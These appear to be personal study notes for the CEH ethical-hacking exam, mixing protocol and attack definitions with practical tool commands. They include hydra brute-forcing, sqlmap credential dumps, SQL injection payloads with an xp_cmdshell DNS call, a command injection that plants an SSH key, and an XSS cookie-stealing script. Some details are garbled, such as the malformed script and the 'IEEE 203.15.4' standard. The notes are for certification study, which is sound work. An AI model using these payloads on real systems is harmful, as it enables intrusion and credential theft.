In such cases, a cloud consumer may request cloud services from a cloud broker, instead of contacting a cloud provider directly," according to NIST Cloud Computing Reference Architecture.

Cloud consumer

The cloud consumer is the principal stakeholder for the cloud computing service. A cloud consumer represents a person or organization that maintains a business relationship with, and uses the service from a cloud provider. A cloud consumer browses the service catalog from a cloud provider, requests the appropriate service, sets up service contracts with the cloud provider, and uses the service.

Cloud carrier

A carrier cloud is a class of cloud that integrates wide area networks (WAN) and other attributes of communications service providers’ carrier-grade networks to enable the deployment of highly demanding applications in the cloud. In contrast, classic cloud computing focuses on the data center, and does not address the network connecting data centers and cloud users. This may result in unpredictable response times and security issues when business-critical data are transferred over the Internet.


# EC-Council's training materials:

Tier-1: Developer machines - image creation, testing and accreditation

Tier-2: Testing and accreditation systems - verification and validation of image contents, signing images and sending them to the registries

Tier-3: Registries - storing images and disseminating images to the orchestrators based on requests

Tier-4: Orchestrators - transforming images into containers and deploying containers to hosts

Tier-5: Hosts - operating and managing containers as instructed by the orchestrator


# Variuos attacks and explanations:

Desynchronization Attack - A typical RFID related threat in which a tag’s key stored in the back-end database and the tag’s memory would not be the same, because of an attacker blocks the communication between the parties.

Session splicing - Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, smallsized packets to the target computer, making it very difficult for an IDS to detect the attack signatures.

Phlashing - Phlashing is a permanent denial of service (DoS) attack that exploits a vulnerability in network-based firmware updates. Such an attack is currently theoretical but if carried out could render the target device inoperable.

# NetBIOS:

NetBIOS is a protocol used for File and Print Sharing under all current versions of Windows. While this in itself is not a problem, the way that the protocol is implemented can be. There are a number of vulnerabilities associated with leaving this port open.

NetBios services:

· NETBIOS Name Service (TCP/UDP: 137)

· NETBIOS Datagram Service (TCP/UDP: 138)

· NETBIOS Session Service (TCP/UDP: 139)

The NetBIOS Suffix, alternately called the NetBIOS End Character (endchar), is the 16th character of a NetBIOS name and indicates service type for the registered name. The number of record types is limited to 255; some commonly used values are:

For unique names:

· 00: Workstation Service (workstation name)

· 03: Windows Messenger service

· 06: Remote Access Service

· 20: File Service (also called Host Record)

· 21: Remote Access Service client

· 1B: Domain Master Browser – Primary Domain Controller for a domain

· 1D: Master Browser

For group names:

· 00: Workstation Service (workgroup/domain name)

· 1C: Domain Controllers for a domain (group record with up to 25 IP addresses)

· 1E: Browser Service Elections


MITM Attacks:

SSL Strip
Burp Suite
Browser Exploitation Framework (BeEF)


# Network Hacking:

Promiscuous mode -  allows you to intercept and read each network packet that arrives in its entirety

DAI - Dynamic ARP inspection - prevents MiTM 


# Windows OS:

Windows OS has default TTL value of 128

According EC-Council's courseware:

"LDAP Enumeration Countermeasures

- By default, LDAP traffic is transmitted unsecured; use SSL or STARTTLS technology to encrypt the traffic.

- Select a username different from your email address and enable account lockout.

- Restrict access to Active Directory by using software such as Citrix.

- Use NTLM or any basic authentication mechanism to limit access to legitimate users.

NTLM Authentication
NT Lan Manager is a proprietary authentication protocol by Microsoft. In the authentication process, user sends login credentials to a domain controller in hashed format. Domain controller responds to a challenge known as nonce to be encrypted by the password's hash. This challenge is a 16 byte random number generated ny the domain controller. By comparing the challenge with the database, domain controller permit or deny the login. Microsoft upgraded its default authentication mechanism from NTLM to Kerberos.

NTLM has two version:

NTLMv1 (Older)
NTLMv2 (Improved)
For additional security layer, NTLM is combined with Security Support Provider.



# Linux APPS :

smbclient //10.10.19.21/anonymous  (accessing smb shares)
smbget -R smb://10.10.19.21/anonymous   (downloading smb files)
 enum4linux
enum4linux -u martin -p apple -U 10.10.10.12 | - u user -p pass -U get user list
enum4linux -u martin -p apple -o 10.10.10.12 | -o get OS info
enum4linux -u martin -p apple -P 10.10.10.12 | -P get password policy info
enum4linux -u martin -p apple -G 10.10.10.12 | -G get groups and members info
enum4linux -u martin -p apple -S 10.10.10.12 | -S get share list info
enum4linux -u martin -p apple -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]
 Wpscan
wpscan --url http://[IP Address]:8080/CEH --enumerate u  (enumerate the usernames stored in the website’s database)
Vulnerability analysis
nikto  -h  http://testphp.vulnweb.com/login.php -Tuning 1
Bruteforce-
Hydra  -L username  -P /usr/share/wordlists/rockyou.txt ftp://xiotz.com
Cryptography-
Hashcalc
Md5 calculator
Cryptool – decode .hex file
Bctextencoder – decrypt text using secret key
Veracrypt – anything related to volume
Crack hashes- hashes.com, cyberchef 
Steganography-
 Steghide  embed  -ef  <filename>  -cf  <image>  -p  <passphrase>
 Steghide  extract  -sf  <image>       (extract hidden data from image)
 Stegcracker  <image>  /usr/share/wordlists/rockyou.txt         (crack the passphrase of image)
  https://futureboy.us/stegano/decinput.html (online steganography tool)
 sha256sum <filename>   (find hash of the file)
 
# More Tools to know for practical
  
Nmap +
Hydra
Sqlmap 
Wpscan
Nikto
John
Hashcat
Metasploit
Responder LLMNR
Wireshark / tcpdump
Steghide
OpenStack
QuickStego
Dirb
Searchsploit
Crunch
Cell
Veracrypt
Hashcalc
Rainbow Crack
netcat+

# Password Cracking Countermeasures

Change default password
Do not store/save passwords in applications
Do not use guessable passwords
Set strong password
Password encryption
Keep credentials secure and secret
Enable SYSKEY
Password salting
Advance security audits
Periodically update passwords
Monitor attacks
Different password for each service
Configure policies for incorrect password attempts

 
 How many machines are active in a network - net discover -i 192.168.1.0/24
Connect to RDP via cmd - mstsc 
Find DNS records - https://www.nslookup.io/
Scan the whole website- (skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.10:8080)
-o output
-S wordlist 
To brute force directories or files-
robuster dir  -u 10.10.10.10  -w /usr/share/dirb/wordlists/common.txt  -x  .txt
 OR
uniscan -u http://10.10.10.12:8080/CEH -q   (for directories)
uniscan –u http://10.10.10.12:8080/CEH -we (enable file check like robots.txt and sitemap.xml)
To get the file from the server- get http://10.10.10.10/secret.txt 
FTP Login - ftp <ip>
get <file name>   (to get file from FTP login)
SSH Login - SSH username@10.10.10.10



# Android Iphone Hacking:

Types of jailbreaking tools

Many different types of jailbreaks have come out over the years, differing in how and when the exploit is applied.

- Untethered Jailbreak

When a jailbroken device is booting, it loads Apple's own kernel initially. The device is then exploited and the kernel is patched every time it is turned on. An untethered jailbreak is a jailbreak that does not require any assistance when it reboots up. The kernel will be patched without the help of a computer or an application. These jailbreaks are uncommon and take a significant amount of reverse engineering to create. For this reason, untethered jailbreaks have become much less popular, with none supporting recent iOS versions.



- Tethered Jailbreak

A tethered jailbreak is the opposite of an untethered jailbreak, in the sense that a computer is required to boot. Without a computer running the jailbreaking software, the iOS device will not be able to boot at all. While using a tethered jailbreak, the user will still be able to restart/kill the device's SpringBoard process without needing to reboot. Many early jailbreaks were offered initially as tethered jailbreaks.



- Semi-tethered Jailbreak

This type of jailbreak allows a user to reboot their phone normally, but upon doing so, the jailbreak and any modified code will be effectively disabled, as it will have an unpatched kernel. Any functionality independent of the jailbreak will still run as normal, such as making a phone call, texting, or using App Store applications. To be able to have a patched kernel and run modified code again, the device must be booted using a computer.



- Semi-untethered Jailbreak

This type of jailbreak is like a semi-tethered jailbreak in which when the device reboots, it no longer has a patched kernel, but the key difference is that the kernel can be patched without using a computer. The kernel is usually patched using an application installed on the device without patches. This type of jailbreak has become increasingly popular, with most recent jailbreaks classified as semi-untethered.

via USB
./adb tcpip 5555
./adb connect 192.168.43.117:5555
./adb devices
./adb  -d shell (Direct an adb command to the only attached USB device)
ls
cd sdcard
ls
cd dcim
cd camera
ls
./adb   push                C:\platform-tools\ota.zip /sdcard/Download           (from pc to android)
 <            pc location   >                  <android location>
 
./adb   pull     /sdcard/Download/magisk_patched.img       C:\platform-tools            (from android to pc)
 <            android location   >                      <pc location>


# WiFi LTE RADIO Hacking:

Zigbee - Protocol based on the IEEE 203.15.4 standard; - Range of 10-100 m. - Designed for small-scale projects which need wireless connection.

Dragonblood - WPA3 

CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol) Provides Integrity- WPA2

MIC (Message Integrity Check) MIC Prevent MITM attack - WEP 

Evil twin attack - SSID Clone

Wardriving: Collecting SSID's

Jamming signal attack: blocking radio waves - SINR SDR

Sinkhole Attack - attract network traffic by advertising its fake routing update



WPA3: 192-bit cryptographic strength in WPA3-Enterprise mode (AES-256 in GCM mode with SHA-384 as HMAC), and still mandates the use of CCMP-128 (AES-128 in CCM mode) as the minimum encryption algorithm in WPA3-Personal mode.





SSL/TLS

SSLv2 - DROWN attack

OpenSSL - heartbleed 

# API

### RESTful API 

Supports: Headers, DATA, Method, Endpoints 

Method: DELETE, POST, GET, PUT,

### REST API

Layered system, Uniform interface , Cacheability ,Statelessness 

REST supports XML, JSON, plain text, HTML.



### SOAP is the Simple Object Access Protocol

SOAP uses an XML data format

### GraphQL 

Injection

SQL Injection

Cross-Site Scripting

OS Command Injection

Server-Side Request Forgery

Broken Authentication & Authorization

# WireShark

Filter examples:

ip.addr == 10.0.0.1 [Sets a filter for any packet with 10.0.0.1, as either the source or dest]  
ip.addr==10.0.0.1  && ip.addr==10.0.0.2 [sets a conversation filter between the two defined IP addresses]  
tcp.time_delta > .250 [sets a filter to display all tcp packets that have a delta time of greater than 250mSec in the context of their stream. Note, this filter requires TCP Conversation Timestamps to be calculated. To learn to do that, click here.]  
tcp.port==4000 [sets a filter for any TCP packet with 4000 as a source or dest port]  
tcp.flags == 0x012 [displays all TCP SYN/ACK packets - shows the connections that had a positive response. Related to this is tcp.flags.syn==1]  
ip.addr == 10.0.0.0/24 [Shows packets to and from any address in the 10.0.0.0/24 space]  
frame contains traffic [displays all packets that contain the word ‘traffic’. Excellent when searching on a specific string or user ID]  
!(arp or icmp or stp) [masks out arp, icmp, stp, or whatever other protocols may be background noise. Allowing you to focus on the traffic of interest]  
eth[0x47:2] == 01:80 [This is an example of an offset filter. It sets a filter for the HEX values of 0x01 and 0x80 specifically at the offset location of 0x47]  
tcp.analysis.flags && !tcp.analysis.window_update [displays all retransmissions, duplicate acks, zero windows, and more in the trace. Helps when tracking down slow application performance and packet loss. It will not include the window updates, since these aren't really important for me to see in most cases.] 

# IPSEC:

IPsec suite:

· Authentication Header (AH) - ensures connectionless integrity
· Encapsulating Security Protocol (ESP) - provides confidentiality
· Security Association (SA)
· IKE - IKEv1 or IKEv2, depending on the version) is the protocol used to set up a security association (SA) in the IPsec protocol suite. IKE builds upon the Oakley protocol and ISAKMP. IKE uses X.509 certificates for authentication 

# SQL hacking and examples


 Boolean-Based Blind SQL Injection:
' OR '1'='1' --
Explanation:
This payload is injected into a SQL query where it evaluates to TRUE for every row. The double dash (--) is used to comment out the rest of the query.

Error-Based Blind SQL Injection
' OR 1=CONVERT(int, (SELECT @@version)) --
Explanation:
This payload attempts to trigger an error by converting the result of SELECT @@version to an integer. If successful, it might reveal information about the database version.


Out-of-band SQLi - leverages a database server’s ability to make DNS requests to pass data to an attacker 
'; EXEC xp_cmdshell('nslookup example.com') --

In-band SQL injection is the most common and easy-to-exploit of SQL injection attacks. In-band SQL injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results.

- Union-based SQLi
' UNION SELECT NULL, username, password FROM users --

SELECT password FROM table1
UNION
SELECT password FROM table2


Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

- Time-based blind SQLi
' OR IF(1=1, SLEEP(5), 0) --

Time-based SQL injection is an inferential SQL injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE.

sqlmap-
site:http://testphp.vulnweb.com/ php?= (for finding vulnerable site)
(for cookies- console->document.cookie)
 
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs   (databases)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables   (tables)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns   (columns)
(dump whole table)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users  --dump 
 OR 
(dump individual  column data)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname  --dump 
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass  --dump
 

command injection

just use ; and type your command
; cd ~ && pwd

# Web applicaiton hacking:

Generate SSH Key Pair:
cd ~/.ssh/id_rsa
ssh-keygen -t rsa -b 2048 -C "your_email@example.com"
cat ~/.ssh/id_rsa.pub
echo "your_public_key_content" > /path/to/target/app/authorized_keys



inject your SSH key to victim device(FYI - SSL key has been modified):

; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCW+gcpi9WfUm1gwtYghmIwnLf1rkca1ZRdgfgdfjjkjkEFDeXXh1eV0prP1cOsUmAmfJl/GBwiGyRo79gkmHE5p0gyH3SlSfIXkI/PDz/E9PNIu/lDBLWNjT8ELJF2GgDU2GiuNh5ryK9zlTiEmvpI5/Nre/K1yliqsCzr5SLWRREQ2uQv8fb6z47YnTOVb09DlOr8HIiXTnQznNaQGeuKkud9K/c9kFojFK9aJgi60XHNUcgbQv9AZZhG2pzFt4cgo/hHv17Zv762Sc33kd+33boIXmKk4+iFYKAH6BkL1kIDnCCV3CB32yKEufcoUBeTDgPu9XkbeHb3VHN8BzuSXXjYHI+vrrj+qj6CsH8atiiTQBG8pGnZYhh2AWvR7pGF3Lydp0k0fcYlVyKuCxZU6RNs7jITJKwG2Uju9sfDHG4GXL8+HkRYQjS+v2Nx1seyR0dyTqAf0BOwEoSlfWLcgzdu/GhrKedyKM9gx/xcU= uggy@kali" > ./authorized_keys


# SSRF

the application contains an open redirection vulnerability in which the following URL:

/product/nextProduct?currentProductId=6&path=http://evil-user.net

returns a redirection to:

http://evil-user.net



Script samples:

This PHP file silently executes the code and grabs the user's session cookie and session ID.


<script> 
document.write("<img.src="https://localhost/submitcookie.php? cookie =" + escape(document.cookie) +"" />); 
</script> 




